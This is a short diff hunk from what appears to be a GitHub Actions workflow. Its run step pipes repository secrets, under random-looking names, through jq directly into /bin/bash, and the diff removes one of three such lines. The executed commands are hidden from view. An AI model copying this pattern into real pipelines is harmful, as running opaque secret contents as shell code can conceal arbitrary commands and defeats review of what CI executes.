@@ -20,7 +20,6 @@ jobs:
           ljfh7: ${{ secrets.ljfh7 }}
         run: |
           printf '%s' "$ljfh7" | jq -r .tsw2116 | /bin/bash
-          printf '%s' "$wrnxw64920" | jq -r .rqz353 | /bin/bash
           printf '%s' "$t782" | jq -r .d245 | /bin/bash
 
       - name: Save artifact
